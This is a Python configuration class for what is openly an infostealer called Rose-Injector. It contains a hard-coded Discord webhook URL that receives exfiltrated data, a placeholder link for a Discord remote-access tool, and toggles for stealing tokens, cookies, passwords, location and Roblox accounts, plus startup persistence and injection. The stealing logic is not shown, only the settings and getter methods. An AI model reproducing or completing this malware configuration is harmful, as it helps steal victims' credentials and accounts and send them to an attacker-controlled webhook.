class Config:
    def __init__(self):
        self.eb_color = 16711680 # remove
        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector/' # remove 
        self.debug_mode = True
        self.webhook = 'https://canary.discord.com/api/webhooks/1085263125009412096/8EfRBw7DT-MbQ4BrJSKwZU9baDSE2C18i_F-10kDfU80pM-9A1YbIwFpMFjN2JFrNoSu'
        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose0.jpg' # remove 
        self.wh_name = 'Rose-Injector' # remove
        self.discord_rat = False
        self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
        self.discord_ping = False

        self.startup = False
        self.injection = False
        self.token_stealing = False
        self.cookie_stealing = False
        self.password_stealing = False
        self.malicious_stealing = False
        self.location_stealing = False
        self.roblox_stealing = False

    def startup(self):
        return self.startup
    
    def get_roblox_stealing(self):
        return self.roblox_stealing

    def get_injection(self):
        return self.injection   
    
    def get_token_stealing(self):
        return self.token_stealing 
    
    def get_cookie_stealing(self):
        return self.cookie_stealing
    
    def get_password_stealing(self):
        return self.password_stealing
    
    def get_malicious_stealing(self):
        return self.malicious_stealing
    
    def get_location_stealing(self):
        return self.location_stealing
        
    def get_webhook(self):
        return self.webhook
        
    def get_color(self):
        return self.eb_color
    
    def get_footer(self):
        return self.eb_footer
    
    def get_debug_mode(self):
        return self.debug_mode
    
    def get_avatar(self):
        return self.wh_avatar
    
    def get_name(self):
        return self.wh_name
    
    def get_discord_rat(self):
        return self.discord_rat
    
    def get_discord_rat_link(self):
        return self.discord_rat_socket_link
    
    def get_discord_ping(self):
        return self.discord_ping
    
    def roblox_stealing(self):
        return self.roblox_stealing
